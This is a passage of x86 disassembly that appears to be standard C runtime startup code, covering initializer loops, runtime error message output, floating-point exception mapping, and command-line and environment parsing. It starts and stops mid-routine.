  422c5b:	cmp    eax,esi
  422c5d:	mov    edi,eax
  422c5f:	jae    0x422c70
  422c61:	mov    eax,DWORD PTR [edi]
  422c63:	test   eax,eax
  422c65:	je     0x422c69
  422c67:	call   eax
  422c69:	add    edi,0x4
  422c6c:	cmp    edi,esi
  422c6e:	jb     0x422c61
  422c70:	mov    eax,0x42a024
  422c75:	mov    esi,0x42a028
  422c7a:	cmp    eax,esi
  422c7c:	mov    edi,eax
  422c7e:	jae    0x422c8f
  422c80:	mov    eax,DWORD PTR [edi]
  422c82:	test   eax,eax
  422c84:	je     0x422c88
  422c86:	call   eax
  422c88:	add    edi,0x4
  422c8b:	cmp    edi,esi
  422c8d:	jb     0x422c80
  422c8f:	cmp    DWORD PTR [ebp+0x10],0x0
  422c93:	pop    edi
  422c94:	pop    esi
  422c95:	je     0x422ca0
  422c97:	push   0x8
  422c99:	call   0x42398b
  422c9e:	jmp    0x422cb2
  422ca0:	push   DWORD PTR [ebp+0x8]
  422ca3:	mov    DWORD PTR ds:0x45cb04,0x1
  422cad:	call   0x422b3b
  422cb2:	pop    ecx
  422cb3:	pop    ebp
  422cb4:	ret    
  422cb5:	push   0x0
  422cb7:	push   0x0
  422cb9:	push   DWORD PTR [esp+0xc]
  422cbd:	call   0x422be2
  422cc2:	add    esp,0xc
  422cc5:	ret    
  422cc6:	push   0x0
  422cc8:	push   0x1
  422cca:	push   DWORD PTR [esp+0xc]
  422cce:	call   0x422be2
  422cd3:	add    esp,0xc
  422cd6:	ret    
  422cd7:	push   0x1
  422cd9:	push   0x0
  422cdb:	push   0x0
  422cdd:	call   0x422be2
  422ce2:	add    esp,0xc
  422ce5:	ret    
  422ce6:	push   0x1
  422ce8:	push   0x1
  422cea:	push   0x0
  422cec:	call   0x422be2
  422cf1:	add    esp,0xc
  422cf4:	ret    
  422cf5:	push   ebp
  422cf6:	mov    ebp,esp
  422cf8:	sub    esp,0x10c
  422cfe:	mov    eax,ds:0x45c430
  422d03:	xor    eax,DWORD PTR [ebp+0x4]
  422d06:	mov    ecx,DWORD PTR [ebp+0x8]
  422d09:	push   ebx
  422d0a:	push   esi
  422d0b:	mov    DWORD PTR [ebp-0x4],eax
  422d0e:	xor    edx,edx
  422d10:	push   edi
  422d11:	xor    eax,eax
  422d13:	cmp    ecx,DWORD PTR [eax*8+0x45c1c8]
  422d1a:	je     0x422d22
  422d1c:	inc    eax
  422d1d:	cmp    eax,0x12
  422d20:	jb     0x422d13
  422d22:	mov    esi,eax
  422d24:	shl    esi,0x3
  422d27:	cmp    ecx,DWORD PTR [esi+0x45c1c8]
  422d2d:	jne    0x422e56
  422d33:	mov    eax,ds:0x45cabc
  422d38:	cmp    eax,0x1
  422d3b:	je     0x422e31
  422d41:	cmp    eax,edx
  422d43:	jne    0x422d52
  422d45:	cmp    DWORD PTR ds:0x45c1c4,0x1
  422d4c:	je     0x422e31
  422d52:	cmp    ecx,0xfc
  422d58:	je     0x422e56
  422d5e:	push   0x104
  422d63:	lea    eax,[ebp-0x10c]
  422d69:	push   eax
  422d6a:	push   edx
  422d6b:	mov    BYTE PTR [ebp-0x8],dl
  422d6e:	call   DWORD PTR ds:0x42803c
  422d74:	test   eax,eax
  422d76:	jne    0x422d8b
  422d78:	lea    eax,[ebp-0x10c]
  422d7e:	push   0x428484
  422d83:	push   eax
  422d84:	call   0x423c40
  422d89:	pop    ecx
  422d8a:	pop    ecx
  422d8b:	lea    eax,[ebp-0x10c]
  422d91:	push   eax
  422d92:	lea    edi,[ebp-0x10c]
  422d98:	call   0x423e70
  422d9d:	inc    eax
  422d9e:	cmp    eax,0x3c
  422da1:	pop    ecx
  422da2:	jbe    0x422dcd
  422da4:	lea    eax,[ebp-0x10c]
  422daa:	push   eax
  422dab:	call   0x423e70
  422db0:	mov    edi,eax
  422db2:	lea    eax,[ebp-0x10c]
  422db8:	sub    eax,0x3b
  422dbb:	push   0x3
  422dbd:	add    edi,eax
  422dbf:	push   0x428480
  422dc4:	push   edi
  422dc5:	call   0x423d40
  422dca:	add    esp,0x10
  422dcd:	push   edi
  422dce:	call   0x423e70
  422dd3:	push   DWORD PTR [esi+0x45c1cc]
  422dd9:	mov    ebx,eax
  422ddb:	call   0x423e70
  422de0:	lea    eax,[ebx+eax*1+0x1c]
  422de4:	pop    ecx
  422de5:	add    eax,0x3
  422de8:	pop    ecx
  422de9:	and    eax,0xfffffffc
  422dec:	call   0x4238b0
  422df1:	mov    ebx,esp
  422df3:	push   0x428464
  422df8:	push   ebx
  422df9:	call   0x423c40
  422dfe:	push   edi
  422dff:	push   ebx
  422e00:	call   0x423c50
  422e05:	push   0x428460
  422e0a:	push   ebx
  422e0b:	call   0x423c50
  422e10:	push   DWORD PTR [esi+0x45c1cc]
  422e16:	push   ebx
  422e17:	call   0x423c50
  422e1c:	push   0x12010
  422e21:	push   0x428438
  422e26:	push   ebx
  422e27:	call   0x423b42
  422e2c:	add    esp,0x2c
  422e2f:	jmp    0x422e56
  422e31:	push   edx
  422e32:	lea    eax,[ebp+0x8]
  422e35:	push   eax
  422e36:	lea    esi,[esi+0x45c1cc]
  422e3c:	push   DWORD PTR [esi]
  422e3e:	call   0x423e70
  422e43:	pop    ecx
  422e44:	push   eax
  422e45:	push   DWORD PTR [esi]
  422e47:	push   0xfffffff4
  422e49:	call   DWORD PTR ds:0x428038
  422e4f:	push   eax
  422e50:	call   DWORD PTR ds:0x428034
  422e56:	lea    esp,[ebp-0x118]
  422e5c:	mov    ecx,DWORD PTR [ebp-0x4]
  422e5f:	xor    ecx,DWORD PTR [ebp+0x4]
  422e62:	call   0x423f2c
  422e67:	pop    edi
  422e68:	pop    esi
  422e69:	pop    ebx
  422e6a:	leave  
  422e6b:	ret    
  422e6c:	mov    eax,ds:0x45cabc
  422e71:	cmp    eax,0x1
  422e74:	je     0x422e83
  422e76:	test   eax,eax
  422e78:	jne    0x422ea4
  422e7a:	cmp    DWORD PTR ds:0x45c1c4,0x1
  422e81:	jne    0x422ea4
  422e83:	push   0xfc
  422e88:	call   0x422cf5
  422e8d:	mov    eax,ds:0x45cb08
  422e92:	test   eax,eax
  422e94:	pop    ecx
  422e95:	je     0x422e99
  422e97:	call   eax
  422e99:	push   0xff
  422e9e:	call   0x422cf5
  422ea3:	pop    ecx
  422ea4:	ret    
  422ea5:	push   ebp
  422ea6:	mov    ebp,esp
  422ea8:	push   ecx
  422ea9:	push   ebx
  422eaa:	push   esi
  422eab:	push   edi
  422eac:	call   0x42370d
  422eb1:	mov    edi,DWORD PTR [ebp+0x8]
  422eb4:	mov    esi,eax
  422eb6:	mov    edx,DWORD PTR [esi+0x54]
  422eb9:	mov    eax,ds:0x45c2dc
  422ebe:	mov    ecx,edx
  422ec0:	cmp    DWORD PTR [ecx],edi
  422ec2:	je     0x422ed1
  422ec4:	lea    ebx,[eax+eax*2]
  422ec7:	add    ecx,0xc
  422eca:	lea    ebx,[edx+ebx*4]
  422ecd:	cmp    ecx,ebx
  422ecf:	jb     0x422ec0
  422ed1:	lea    eax,[eax+eax*2]
  422ed4:	lea    eax,[edx+eax*4]
  422ed7:	cmp    ecx,eax
  422ed9:	jae    0x422edf
  422edb:	cmp    DWORD PTR [ecx],edi
  422edd:	je     0x422ee1
  422edf:	xor    ecx,ecx
  422ee1:	test   ecx,ecx
  422ee3:	je     0x422ffb
  422ee9:	mov    ebx,DWORD PTR [ecx+0x8]
  422eec:	test   ebx,ebx
  422eee:	mov    DWORD PTR [ebp+0x8],ebx
  422ef1:	je     0x422ffb
  422ef7:	cmp    ebx,0x5
  422efa:	jne    0x422f08
  422efc:	and    DWORD PTR [ecx+0x8],0x0
  422f00:	xor    eax,eax
  422f02:	inc    eax
  422f03:	jmp    0x423004
  422f08:	cmp    ebx,0x1
  422f0b:	je     0x422ff6
  422f11:	mov    eax,DWORD PTR [esi+0x58]
  422f14:	mov    DWORD PTR [ebp-0x4],eax
  422f17:	mov    eax,DWORD PTR [ebp+0xc]
  422f1a:	mov    DWORD PTR [esi+0x58],eax
  422f1d:	mov    eax,DWORD PTR [ecx+0x4]
  422f20:	cmp    eax,0x8
  422f23:	jne    0x422fe8
  422f29:	mov    edx,DWORD PTR ds:0x45c2d0
  422f2f:	mov    eax,ds:0x45c2d4
  422f34:	add    eax,edx
  422f36:	cmp    edx,eax
  422f38:	jge    0x422f61
  422f3a:	lea    eax,[edx+edx*2]
  422f3d:	shl    eax,0x2
  422f40:	mov    edi,DWORD PTR [esi+0x54]
  422f43:	and    DWORD PTR [eax+edi*1+0x8],0x0
  422f48:	mov    edi,DWORD PTR ds:0x45c2d0
  422f4e:	mov    ebx,DWORD PTR ds:0x45c2d4
  422f54:	inc    edx
  422f55:	add    ebx,edi
  422f57:	add    eax,0xc
  422f5a:	cmp    edx,ebx
  422f5c:	jl     0x422f40
  422f5e:	mov    ebx,DWORD PTR [ebp+0x8]
  422f61:	mov    ecx,DWORD PTR [ecx]
  422f63:	cmp    ecx,0xc000008e
  422f69:	mov    edi,DWORD PTR [esi+0x5c]
  422f6c:	jne    0x422f77
  422f6e:	mov    DWORD PTR [esi+0x5c],0x83
  422f75:	jmp    0x422fdb
  422f77:	cmp    ecx,0xc0000090
  422f7d:	jne    0x422f88
  422f7f:	mov    DWORD PTR [esi+0x5c],0x81
  422f86:	jmp    0x422fdb
  422f88:	cmp    ecx,0xc0000091
  422f8e:	jne    0x422f99
  422f90:	mov    DWORD PTR [esi+0x5c],0x84
  422f97:	jmp    0x422fdb
  422f99:	cmp    ecx,0xc0000093
  422f9f:	jne    0x422faa
  422fa1:	mov    DWORD PTR [esi+0x5c],0x85
  422fa8:	jmp    0x422fdb
  422faa:	cmp    ecx,0xc000008d
  422fb0:	jne    0x422fbb
  422fb2:	mov    DWORD PTR [esi+0x5c],0x82
  422fb9:	jmp    0x422fdb
  422fbb:	cmp    ecx,0xc000008f
  422fc1:	jne    0x422fcc
  422fc3:	mov    DWORD PTR [esi+0x5c],0x86
  422fca:	jmp    0x422fdb
  422fcc:	cmp    ecx,0xc0000092
  422fd2:	jne    0x422fdb
  422fd4:	mov    DWORD PTR [esi+0x5c],0x8a
  422fdb:	push   DWORD PTR [esi+0x5c]
  422fde:	push   0x8
  422fe0:	call   ebx
  422fe2:	pop    ecx
  422fe3:	mov    DWORD PTR [esi+0x5c],edi
  422fe6:	jmp    0x422fef
  422fe8:	and    DWORD PTR [ecx+0x8],0x0
  422fec:	push   eax
  422fed:	call   ebx
  422fef:	mov    eax,DWORD PTR [ebp-0x4]
  422ff2:	pop    ecx
  422ff3:	mov    DWORD PTR [esi+0x58],eax
  422ff6:	or     eax,0xffffffff
  422ff9:	jmp    0x423004
  422ffb:	push   DWORD PTR [ebp+0xc]
  422ffe:	call   DWORD PTR ds:0x428040
  423004:	pop    edi
  423005:	pop    esi
  423006:	pop    ebx
  423007:	leave  
  423008:	ret    
  423009:	cmp    DWORD PTR ds:0x45d26c,0x0
  423010:	jne    0x423017
  423012:	call   0x42444c
  423017:	push   esi
  423018:	mov    esi,DWORD PTR ds:0x45d274
  42301e:	test   esi,esi
  423020:	jne    0x423029
  423022:	mov    esi,0x42849b
  423027:	jmp    0x42306e
  423029:	mov    al,BYTE PTR [esi]
  42302b:	cmp    al,0x22
  42302d:	jne    0x423057
  42302f:	inc    esi
  423030:	mov    al,BYTE PTR [esi]
  423032:	cmp    al,0x22
  423034:	je     0x423067
  423036:	test   al,al
  423038:	je     0x423050
  42303a:	movzx  eax,al
  42303d:	push   eax
  42303e:	call   0x423f6b
  423043:	test   eax,eax
  423045:	pop    ecx
  423046:	je     0x423049
  423048:	inc    esi
  423049:	inc    esi
  42304a:	mov    al,BYTE PTR [esi]
  42304c:	cmp    al,0x22
  42304e:	jne    0x423036
  423050:	cmp    BYTE PTR [esi],0x22
  423053:	jne    0x423068
  423055:	jmp    0x423067
  423057:	cmp    al,0x20
  423059:	jbe    0x423068
  42305b:	inc    esi
  42305c:	cmp    BYTE PTR [esi],0x20
  42305f:	ja     0x42305b
  423061:	jmp    0x423068
  423063:	cmp    al,0x20
  423065:	ja     0x42306e
  423067:	inc    esi
  423068:	mov    al,BYTE PTR [esi]
  42306a:	test   al,al
  42306c:	jne    0x423063
  42306e:	mov    eax,esi
  423070:	pop    esi
  423071:	ret    
  423072:	push   ebx
  423073:	xor    ebx,ebx
  423075:	cmp    DWORD PTR ds:0x45d26c,ebx
  42307b:	push   esi
  42307c:	push   edi
  42307d:	jne    0x423084
  42307f:	call   0x42444c
  423084:	mov    esi,DWORD PTR ds:0x45cab4
  42308a:	xor    edi,edi
  42308c:	cmp    esi,ebx
  42308e:	jne    0x4230a2
  423090:	jmp    0x4230c2
  423092:	cmp    al,0x3d
  423094:	je     0x423097
  423096:	inc    edi
  423097:	push   esi
  423098:	call   0x423e70
  42309d:	pop    ecx
  42309e:	lea    esi,[esi+eax*1+0x1]
  4230a2:	mov    al,BYTE PTR [esi]
  4230a4:	cmp    al,bl
  4230a6:	jne    0x423092
  4230a8:	lea    eax,[edi*4+0x4]
  4230af:	push   eax
  4230b0:	call   0x424582
  4230b5:	mov    edi,eax
  4230b7:	cmp    edi,ebx
  4230b9:	pop    ecx
  4230ba:	mov    DWORD PTR ds:0x45cae4,edi
  4230c0:	jne    0x4230c7
  4230c2:	or     eax,0xffffffff
  4230c5:	jmp    0x42311f
  4230c7:	mov    esi,DWORD PTR ds:0x45cab4
  4230cd:	push   ebp
  4230ce:	jmp    0x4230fa
  4230d0:	push   esi
  4230d1:	call   0x423e70
  4230d6:	mov    ebp,eax
  4230d8:	inc    ebp
  4230d9:	cmp    BYTE PTR [esi],0x3d
  4230dc:	pop    ecx
  4230dd:	je     0x4230f8
  4230df:	push   ebp
  4230e0:	call   0x424582
  4230e5:	cmp    eax,ebx
  4230e7:	pop    ecx
  4230e8:	mov    DWORD PTR [edi],eax
  4230ea:	je     0x423123
  4230ec:	push   esi
  4230ed:	push   eax
  4230ee:	call   0x423c40
  4230f3:	pop    ecx
  4230f4:	pop    ecx
  4230f5:	add    edi,0x4
  4230f8:	add    esi,ebp
  4230fa:	cmp    BYTE PTR [esi],bl
  4230fc:	jne    0x4230d0
  4230fe:	push   DWORD PTR ds:0x45cab4
  423104:	call   0x42446a
  423109:	mov    DWORD PTR ds:0x45cab4,ebx
  42310f:	mov    DWORD PTR [edi],ebx
  423111:	mov    DWORD PTR ds:0x45d260,0x1
  42311b:	xor    eax,eax
  42311d:	pop    ecx
  42311e:	pop    ebp
  42311f:	pop    edi
  423120:	pop    esi
  423121:	pop    ebx
  423122:	ret    
  423123:	push   DWORD PTR ds:0x45cae4
  423129:	call   0x42446a
  42312e:	mov    DWORD PTR ds:0x45cae4,ebx
  423134:	or     eax,0xffffffff
  423137:	jmp    0x42311d
  423139:	push   ebp
  42313a:	mov    ebp,esp
  42313c:	push   ecx
  42313d:	push   ebx
  42313e:	mov    ebx,DWORD PTR [ebp+0xc]
  423141:	xor    edx,edx
  423143:	cmp    DWORD PTR [ebp+0x8],edx
  423146:	push   edi
  423147:	mov    DWORD PTR [esi],edx
  423149:	mov    edi,ecx
  42314b:	mov    DWORD PTR [ebx],0x1
  423151:	je     0x42315c
  423153:	mov    ecx,DWORD PTR [ebp+0x8]
  423156:	add    DWORD PTR [ebp+0x8],0x4
  42315a:	mov    DWORD PTR [ecx],edi
  42315c:	cmp    BYTE PTR [eax],0x22
  42315f:	jne    0x42316f
  423161:	xor    ecx,ecx
  423163:	test   edx,edx
  423165:	sete   cl
  423168:	inc    eax
  423169:	mov    edx,ecx
  42316b:	mov    cl,0x22
  42316d:	jmp    0x42319c
  42316f:	inc    DWORD PTR [esi]
  423171:	test   edi,edi
  423173:	je     0x42317a
  423175:	mov    cl,BYTE PTR [eax]
  423177:	mov    BYTE PTR [edi],cl
  423179:	inc    edi
  42317a:	mov    cl,BYTE PTR [eax]
  42317c:	movzx  ebx,cl
  42317f:	inc    eax
  423180:	test   BYTE PTR [ebx+0x45cf21],0x4
  423187:	je     0x423195
  423189:	inc    DWORD PTR [esi]
  42318b:	test   edi,edi
  42318d:	je     0x423194
  42318f:	mov    bl,BYTE PTR [eax]
  423191:	mov    BYTE PTR [edi],bl
  423193:	inc    edi
  423194:	inc    eax
  423195:	test   cl,cl
  423197:	mov    ebx,DWORD PTR [ebp+0xc]
  42319a:	je     0x4231ce
  42319c:	test   edx,edx
  42319e:	jne    0x42315c
  4231a0:	cmp    cl,0x20
  4231a3:	je     0x4231aa
  4231a5:	cmp    cl,0x9
  4231a8:	jne    0x42315c
  4231aa:	test   edi,edi
  4231ac:	je     0x4231b2
  4231ae:	and    BYTE PTR [edi-0x1],0x0
  4231b2:	and    DWORD PTR [ebp-0x4],0x0
  4231b6:	cmp    BYTE PTR [eax],0x0
  4231b9:	je     0x423295
  4231bf:	mov    cl,BYTE PTR [eax]
  4231c1:	cmp    cl,0x20
  4231c4:	je     0x4231cb
  4231c6:	cmp    cl,0x9
  4231c9:	jne    0x4231d1
  4231cb:	inc    eax
  4231cc:	jmp    0x4231bf
  4231ce:	dec    eax
  4231cf:	jmp    0x4231b2
  4231d1:	cmp    BYTE PTR [eax],0x0
  4231d4:	je     0x423295
  4231da:	cmp    DWORD PTR [ebp+0x8],0x0
  4231de:	je     0x4231e9
  4231e0:	mov    ecx,DWORD PTR [ebp+0x8]
  4231e3:	add    DWORD PTR [ebp+0x8],0x4
  4231e7:	mov    DWORD PTR [ecx],edi
  4231e9:	inc    DWORD PTR [ebx]
  4231eb:	xor    ebx,ebx
  4231ed:	inc    ebx
  4231ee:	xor    edx,edx
  4231f0:	jmp    0x4231f4
  4231f2:	inc    eax
  4231f3:	inc    edx
  4231f4:	cmp    BYTE PTR [eax],0x5c
  4231f7:	je     0x4231f2
  4231f9:	cmp    BYTE PTR [eax],0x22
  4231fc:	jne    0x423224
  4231fe:	test   dl,0x1
  423201:	jne    0x423222
  423203:	cmp    DWORD PTR [ebp-0x4],0x0
  423207:	je     0x423215
  423209:	lea    ecx,[eax+0x1]
  42320c:	cmp    BYTE PTR [ecx],0x22
  42320f:	jne    0x423215
  423211:	mov    eax,ecx
  423213:	jmp    0x423217
  423215:	xor    ebx,ebx
  423217:	xor    ecx,ecx
  423219:	cmp    DWORD PTR [ebp-0x4],ecx
  42321c:	sete   cl
  42321f:	mov    DWORD PTR [ebp-0x4],ecx
  423222:	shr    edx,1
  423224:	test   edx,edx
  423226:	je     0x423235
  423228:	test   edi,edi
  42322a:	je     0x423230
  42322c:	mov    BYTE PTR [edi],0x5c
  42322f:	inc    edi
  423230:	inc    DWORD PTR [esi]
  423232:	dec    edx
  423233:	jne    0x423228
  423235:	mov    cl,BYTE PTR [eax]
  423237:	test   cl,cl
  423239:	je     0x423283
  42323b:	cmp    DWORD PTR [ebp-0x4],0x0
  42323f:	jne    0x42324b
  423241:	cmp    cl,0x20
  423244:	je     0x423283
  423246:	cmp    cl,0x9
  423249:	je     0x423283
  42324b:	test   ebx,ebx
  42324d:	je     0x42327d
  42324f:	test   edi,edi
  423251:	je     0x42326c
  423253:	movzx  edx,cl
  423256:	test   BYTE PTR [edx+0x45cf21],0x4
  42325d:	je     0x423265
  42325f:	mov    BYTE PTR [edi],cl
  423261:	inc    edi
  423262:	inc    eax
  423263:	inc    DWORD PTR [esi]
  423265:	mov    cl,BYTE PTR [eax]
  423267:	mov    BYTE PTR [edi],cl
  423269:	inc    edi
  42326a:	jmp    0x42327b
  42326c:	movzx  ecx,cl
  42326f:	test   BYTE PTR [ecx+0x45cf21],0x4
  423276:	je     0x42327b
  423278:	inc    eax
  423279:	inc    DWORD PTR [esi]
  42327b:	inc    DWORD PTR [esi]
  42327d:	inc    eax
  42327e:	jmp    0x4231eb
  423283:	test   edi,edi
  423285:	je     0x42328b
  423287:	and    BYTE PTR [edi],0x0
  42328a:	inc    edi
  42328b:	inc    DWORD PTR [esi]
  42328d:	mov    ebx,DWORD PTR [ebp+0xc]
  423290:	jmp    0x4231b6
  423295:	mov    eax,DWORD PTR [ebp+0x8]
  423298:	test   eax,eax
  42329a:	je     0x42329f
  42329c:	and    DWORD PTR [eax],0x0
  42329f:	inc    DWORD PTR [ebx]
  4232a1:	pop    edi
  4232a2:	pop    ebx
  4232a3:	leave  
  4232a4:	ret    
  4232a5:	push   ebp
  4232a6:	mov    ebp,esp
  4232a8:	push   ecx
  4232a9:	push   ecx
  4232aa:	push   ebx
  4232ab:	push   esi
  4232ac:	push   edi
  4232ad:	xor    edi,edi
  4232af:	cmp    DWORD PTR ds:0x45d26c,edi
  4232b5:	jne    0x4232bc
  4232b7:	call   0x42444c
  4232bc:	and    BYTE PTR ds:0x45cc14,0x0
  4232c3:	push   0x104
  4232c8:	mov    esi,0x45cb10
  4232cd:	push   esi
  4232ce:	push   edi
  4232cf:	call   DWORD PTR ds:0x42803c
  4232d5:	mov    eax,ds:0x45d274
  4232da:	cmp    eax,edi
  4232dc:	mov    DWORD PTR ds:0x45caf4,esi
  4232e2:	je     0x4232eb
  4232e4:	cmp    BYTE PTR [eax],0x0
  4232e7:	mov    ebx,eax
  4232e9:	jne    0x4232ed
  4232eb:	mov    ebx,esi
  4232ed:	lea    eax,[ebp-0x4]
  4232f0:	push   eax
  4232f1:	push   edi
  4232f2:	lea    esi,[ebp-0x8]
  4232f5:	xor    ecx,ecx
  4232f7:	mov    eax,ebx
  4232f9:	call   0x423139
  4232fe:	mov    esi,DWORD PTR [ebp-0x4]
  423301:	mov    eax,DWORD PTR [ebp-0x8]
  423304:	shl    esi,0x2
  423307:	add    eax,esi
  423309:	push   eax
  42330a:	call   0x424582
  42330f:	mov    edi,eax
  423311:	add    esp,0xc
  423314:	test   edi,edi
  423316:	jne    0x42331d
  423318:	or     eax,0xffffffff
  42331b:	jmp    0x423342
  42331d:	lea    eax,[ebp-0x4]
  423320:	push   eax
  423321:	lea    ecx,[esi+edi*1]
  423324:	push   edi
  423325:	lea    esi,[ebp-0x8]
  423328:	mov    eax,ebx
  42332a:	call   0x423139
  42332f:	mov    eax,DWORD PTR [ebp-0x4]
  423332:	dec    eax
  423333:	pop    ecx
  423334:	mov    ds:0x45cad8,eax
  423339:	pop    ecx
  42333a:	mov    DWORD PTR ds:0x45cadc,edi
  423340:	xor    eax,eax
  423342:	pop    edi
  423343:	pop    esi
  423344:	pop    ebx
  423345:	leave  
  423346:	ret    
  423347:	push   ecx
  423348:	push   ecx
  423349:	mov    eax,ds:0x45cc18
  42334e:	push   ebx
  42334f:	push   ebp
  423350:	push   esi
  423351:	push   edi
  423352:	mov    edi,DWORD PTR ds:0x428054
  423358:	xor    ebx,ebx
  42335a:	xor    esi,esi
  42335c:	cmp    eax,ebx
  42335e:	push   0x2
  423360:	pop    ebp
  423361:	jne    0x423390
  423363:	call   edi
  423365:	mov    esi,eax
  423367:	cmp    esi,ebx
  423369:	je     0x423377
  42336b:	mov    DWORD PTR ds:0x45cc18,0x1
  423375:	jmp    0x423395
  423377:	call   DWORD PTR ds:0x428010
  42337d:	cmp    eax,0x78
  423380:	jne    0x42338b
  423382:	mov    eax,ebp
  423384:	mov    ds:0x45cc18,eax
  423389:	jmp    0x423390
  42338b:	mov    eax,ds:0x45cc18
  423390:	cmp    eax,0x1
  423393:	jne    0x423412
  423395:	cmp    esi,ebx
  423397:	jne    0x4233a1
  423399:	call   edi
  42339b:	mov    esi,eax
  42339d:	cmp    esi,ebx
  42339f:	je     0x42341a
  4233a1:	cmp    WORD PTR [esi],bx
  4233a4:	mov    eax,esi
  4233a6:	je     0x4233b6
  4233a8:	add    eax,ebp
  4233aa:	cmp    WORD PTR [eax],bx
  4233ad:	jne    0x4233a8
  4233af:	add    eax,ebp
  4233b1:	cmp    WORD PTR [eax],bx
  4233b4:	jne    0x4233a8
  4233b6:	mov    edi,DWORD PTR ds:0x428050
  4233bc:	push   ebx
  4233bd:	push   ebx
  4233be:	push   ebx
  4233bf:	sub    eax,esi
  4233c1:	push   ebx
  4233c2:	sar    eax,1
  4233c4:	inc    eax
  4233c5:	push   eax
  4233c6:	push   esi
  4233c7:	push   ebx
  4233c8:	push   ebx
  4233c9:	mov    DWORD PTR [esp+0x34],eax
  4233cd:	call   edi
  4233cf:	mov    ebp,eax
  4233d1:	cmp    ebp,ebx
  4233d3:	je     0x423407
  4233d5:	push   ebp
  4233d6:	call   0x424582
  4233db:	cmp    eax,ebx
  4233dd:	pop    ecx
  4233de:	mov    DWORD PTR [esp+0x10],eax
  4233e2:	je     0x423407
  4233e4:	push   ebx
  4233e5:	push   ebx
  4233e6:	push   ebp
  4233e7:	push   eax
  4233e8:	push   DWORD PTR [esp+0x24]
  4233ec:	push   esi
  4233ed:	push   ebx
  4233ee:	push   ebx
  4233ef:	call   edi
  4233f1:	test   eax,eax
  4233f3:	jne    0x423403
  4233f5:	push   DWORD PTR [esp+0x10]
  4233f9:	call   0x42446a
  4233fe:	pop    ecx
  4233ff:	mov    DWORD PTR [esp+0x10],ebx
  423403:	mov    ebx,DWORD PTR [esp+0x10]
  423407:	push   esi
  423408:	call   DWORD PTR ds:0x42804c
  42340e:	mov    eax,ebx
  423410:	jmp    0x423462
  423412:	cmp    eax,ebp
  423414:	je     0x42341e
  423416:	cmp    eax,ebx
  423418:	je     0x42341e
  42341a:	xor    eax,eax
  42341c:	jmp    0x423462
  42341e:	call   DWORD PTR ds:0x428048
  423424:	mov    esi,eax
  423426:	cmp    esi,ebx
  423428:	je     0x42341a
  42342a:	cmp    BYTE PTR [esi],bl
  42342c:	je     0x423438
  42342e:	inc    eax
  42342f:	cmp    BYTE PTR [eax],bl
  423431:	jne    0x42342e
  423433:	inc    eax
  423434:	cmp    BYTE PTR [eax],bl
  423436:	jne    0x42342e
  423438:	sub    eax,esi
  42343a:	inc    eax
  42343b:	mov    ebp,eax
  42343d:	push   ebp
  42343e:	call   0x424582
  423443:	mov    edi,eax
  423445:	cmp    edi,ebx
  423447:	pop    ecx
  423448:	jne    0x42344e
  42344a:	xor    edi,edi
  42344c:	jmp    0x423459
  42344e:	push   ebp
  42344f:	push   esi
  423450:	push   edi
  423451:	call   0x4245a0
  423456:	add    esp,0xc
  423459:	push   esi
  42345a:	call   DWORD PTR ds:0x428044
  423460:	mov    eax,edi
  423462:	pop    edi
  423463:	pop    esi
  423464:	pop    ebp
  423465:	pop    ebx
  423466:	pop    ecx
  423467:	pop    ecx
  423468:	ret    
  423469:	sub    esp,0x48
  42346c:	push   ebx
  42346d:	mov    ebx,0x480
  423472:	push   ebx
  423473:	call   0x424582
  423478:	test   eax,eax
  42347a:	pop    ecx
  42347b:	jne    0x423485
  42347d:	or     eax,0xffffffff
  423480:	jmp    0x423662
  423485:	mov    ds:0x45d160,eax
  42348a:	mov    DWORD PTR ds:0x45d148,0x20
  423494:	lea    ecx,[eax+0x480]
  42349a:	jmp    0x4234ba
  42349c:	and    BYTE PTR [eax+0x4],0x0
  4234a0:	or     DWORD PTR [eax],0xffffffff
  4234a3:	and    DWORD PTR [eax+0x8],0x0
  4234a7:	mov    BYTE PTR [eax+0x5],0xa
  4234ab:	mov    ecx,DWORD PTR ds:0x45d160
  4234b1:	add    eax,0x24
  4234b4:	add    ecx,0x480
  4234ba:	cmp    eax,ecx
  4234bc:	jb     0x42349c
  4234be:	push   ebp
  4234bf:	push   esi
  4234c0:	push   edi
  4234c1:	lea    eax,[esp+0x14]
  4234c5:	push   eax
  4234c6:	call   DWORD PTR ds:0x42801c
  4234cc:	cmp    WORD PTR [esp+0x46],0x0
  4234d2:	je     0x4235c1
  4234d8:	mov    eax,DWORD PTR [esp+0x48]
  4234dc:	test   eax,eax
  4234de:	je     0x4235c1
  4234e4:	mov    edi,DWORD PTR [eax]
  4234e6:	lea    ebp,[eax+0x4]
  4234e9:	lea    eax,[edi+ebp*1]
  4234ec:	mov    DWORD PTR [esp+0x10],eax
  4234f0:	mov    eax,0x800
  4234f5:	cmp    edi,eax
  4234f7:	jl     0x4234fb
  4234f9:	mov    edi,eax
  4234fb:	cmp    DWORD PTR ds:0x45d148,edi
  423501:	jge    0x423551
  423503:	mov    esi,0x45d164
  423508:	push   ebx
  423509:	call   0x424582
  42350e:	test   eax,eax
  423510:	pop    ecx
  423511:	je     0x42354b
  423513:	add    DWORD PTR ds:0x45d148,0x20
  42351a:	mov    DWORD PTR [esi],eax
  42351c:	lea    ecx,[eax+0x480]
  423522:	jmp    0x42353a
  423524:	and    BYTE PTR [eax+0x4],0x0
  423528:	or     DWORD PTR [eax],0xffffffff
  42352b:	and    DWORD PTR [eax+0x8],0x0
  42352f:	mov    BYTE PTR [eax+0x5],0xa
  423533:	mov    ecx,DWORD PTR [esi]
  423535:	add    eax,0x24
  423538:	add    ecx,ebx
  42353a:	cmp    eax,ecx
  42353c:	jb     0x423524
  42353e:	add    esi,0x4
  423541:	cmp    DWORD PTR ds:0x45d148,edi
  423547:	jl     0x423508
  423549:	jmp    0x423551
  42354b:	mov    edi,DWORD PTR ds:0x45d148
  423551:	xor    ebx,ebx
  423553:	test   edi,edi
  423555:	jle    0x4235c1
  423557:	mov    eax,DWORD PTR [esp+0x10]
  42355b:	mov    eax,DWORD PTR [eax]
  42355d:	cmp    eax,0xffffffff
  423560:	je     0x4235b6
  423562:	mov    cl,BYTE PTR [ebp+0x0]
  423565:	test   cl,0x1
  423568:	je     0x4235b6
  42356a:	test   cl,0x8
  42356d:	jne    0x42357a
  42356f:	push   eax
  423570:	call   DWORD PTR ds:0x42805c
  423576:	test   eax,eax
  423578:	je     0x4235b6
  42357a:	mov    ecx,ebx
  42357c:	mov    eax,ebx
  42357e:	and    eax,0x1f
  423581:	lea    eax,[eax+eax*8]
  423584:	sar    ecx,0x5
  423587:	mov    ecx,DWORD PTR [ecx*4+0x45d160]
